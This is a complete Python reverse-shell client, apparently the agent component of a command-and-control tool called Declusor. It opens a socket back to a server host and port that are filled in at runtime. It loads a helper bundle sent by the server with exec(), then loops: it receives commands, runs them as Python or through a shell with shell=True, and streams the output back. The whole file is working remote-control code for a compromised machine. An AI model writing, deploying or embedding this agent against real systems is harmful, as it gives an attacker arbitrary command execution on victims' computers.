#!/usr/bin/env python3
"""Declusor py_socket reverse-shell client agent.

Self-contained Python launcher script that connects back to the Declusor
server, receives command payloads, executes them, and streams output.

Uses only the Python standard library for maximum compatibility with
Python 3.6+ environments on Linux, macOS, and Windows.

Template placeholders are substituted at runtime by the Declusor server:
  $HOST        - IP address or hostname of the Declusor server
  $PORT        - TCP port of the Declusor server
  $ACKNOWLEDGE - Hex-encoded ACK sentinel transmitted after each response
"""

import io
import os
import socket
import subprocess
import sys

HOST = "$HOST"
PORT = int("$PORT")
ACKNOWLEDGE = bytes.fromhex("$ACKNOWLEDGE")

# Persistent session scope — helpers loaded during initialization live here.
_SESSION_SCOPE: dict = {"__name__": "__declusor__"}


def _is_python_payload(payload: str) -> bool:
    """Return True if the payload looks like Python source rather than a shell command."""

    first_line = payload.lstrip().split("\n", 1)[0].strip().lower()
    python_markers = ("#!/usr/bin/env python", "#!/usr/bin/python", "#!python")

    if any(first_line.startswith(m) for m in python_markers):
        return True

    python_keywords = ("import ", "from ", "def ", "class ", "async def ")

    return any(first_line.startswith(k) for k in python_keywords)


def _is_python_expression(payload: str) -> bool:
    """Return True if the payload is a Python expression (function call registered in session)."""

    stripped = payload.strip()

    # Check if it is a call to a known session function e.g. execute_base64_encoded_value('...')
    for name in _SESSION_SCOPE:
        if stripped.startswith(name + "(") and stripped.endswith(")"):
            return True

    return False


def _execute_payload(payload: str, sock: socket.socket) -> None:
    """Execute a payload string and stream the output back through the socket."""

    use_python = _is_python_payload(payload) or _is_python_expression(payload)

    capture = io.StringIO()
    original_stdout = sys.stdout
    original_stderr = sys.stderr

    try:
        if use_python:
            sys.stdout = capture
            sys.stderr = capture

            try:
                exec(payload, _SESSION_SCOPE)  # noqa: S102
            except Exception as exc:
                capture.write(f"[py_socket error] {type(exc).__name__}: {exc}\n")
            finally:
                sys.stdout = original_stdout
                sys.stderr = original_stderr

            output = capture.getvalue().encode(errors="replace")
        else:
            proc = subprocess.Popen(
                payload,
                shell=True,  # noqa: S602
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
            output, _ = proc.communicate()
            if output is None:
                output = b""

        sock.sendall(output + ACKNOWLEDGE)

    except Exception as exc:
        sys.stdout = original_stdout
        sys.stderr = original_stderr

        error_msg = f"[py_socket error] {type(exc).__name__}: {exc}\n"
        sock.sendall(error_msg.encode(errors="replace") + ACKNOWLEDGE)


def _receive_payload(sock: socket.socket) -> str | None:
    """Read a null-terminated payload from the socket."""
    buffer = bytearray()

    while True:
        chunk = sock.recv(4096)

        if not chunk:
            return None

        buffer.extend(chunk)

        if b"\x00" in buffer:
            payload_bytes, _, _ = buffer.partition(b"\x00")
            return payload_bytes.decode(errors="replace")


def main() -> None:
    """Connect to the Declusor server and enter the command dispatch loop."""
    with socket.create_connection((HOST, PORT)) as sock:
        # --- Initialization handshake ---
        # Receive and execute the helper library bundle.
        library_payload = _receive_payload(sock)

        if library_payload:
            try:
                exec(library_payload, _SESSION_SCOPE)  # noqa: S102
            except Exception as exc:
                pass  # Continue even if helpers fail to load

        # Transmit the ACK sentinel to signal readiness.
        sock.sendall(ACKNOWLEDGE)

        # --- Command dispatch loop ---
        while True:
            payload = _receive_payload(sock)

            if payload is None:
                break

            # Server ACK for write framing.
            sock.sendall(b"\x00")

            _execute_payload(payload, sock)


if __name__ == "__main__":
    main()
